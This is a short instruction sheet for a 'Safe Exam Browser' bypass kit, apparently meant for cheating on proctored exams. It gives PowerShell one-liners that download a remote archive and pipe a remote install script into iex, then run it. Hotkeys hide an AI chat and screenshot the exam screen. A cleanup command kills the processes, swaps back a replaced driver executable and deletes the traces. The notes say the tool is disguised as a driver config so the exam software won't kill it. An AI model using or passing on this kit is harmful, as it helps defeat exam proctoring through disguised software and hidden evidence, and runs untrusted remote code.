SEB Bypass PoC v2 - Complete Kit
================================

SETUP (once per PC):
  1. Download + setup:
     powershell -Command "mkdir '%USERPROFILE%\seb-kit' -Force; Invoke-WebRequest 'https://github.com/johnisbest151-bit/seb-kit/archive/main.zip' -OutFile '%TEMP%\sk.zip'; Expand-Archive '%TEMP%\sk.zip' '%TEMP%\sk' -Force; Copy-Item '%TEMP%\sk\seb-kit-main\*' '%USERPROFILE%\seb-kit' -Recurse -Force" && cd /d %USERPROFILE%\seb-kit && setup.cmd

  2. Install agy:
     powershell -Command "irm https://antigravity.google/cli/install.ps1 | iex"

  3. Login agy:
     agy

RUN (before each exam):
  cd /d %USERPROFILE%\seb-kit && run.cmd

CONTROLS:
  Ctrl+Space  = toggle SEB <-> Default desktop
  Ctrl+X      = screenshot SEB screen
  Ctrl+Z      = show/hide AI chat

CLEANUP (after exam):
  taskkill /f /im HpSebEscape.exe >nul 2>&1 && taskkill /f /im AltA2dpConfig.exe >nul 2>&1 && taskkill /f /im edge_feedback.exe >nul 2>&1 && copy /Y "C:\Program Files\Luculent Systems\AltA2DP\AltA2dpConfig.exe.real_backup" "C:\Program Files\Luculent Systems\AltA2DP\AltA2dpConfig.exe" >nul 2>&1 && del "C:\Program Files\Luculent Systems\AltA2DP\AltA2dpConfig.exe.real_backup" >nul 2>&1 && rmdir /s /q %USERPROFILE%\seb-kit >nul 2>&1 && rmdir /s /q %USERPROFILE%\Downloads\SEB_Captures >nul 2>&1 && rmdir /s /q %LOCALAPPDATA%\agy >nul 2>&1 && rmdir /s /q %TEMP%\sk >nul 2>&1 && del %TEMP%\sk.zip >nul 2>&1

NOTES:
  - No admin needed to run (admin only needed if A2DP driver is installed)
  - Without A2DP: app runs from user folder, use Ctrl+Space to access
  - With A2DP: app disguised as driver config, SEB won't kill it
  - Works on Windows 10 & 11
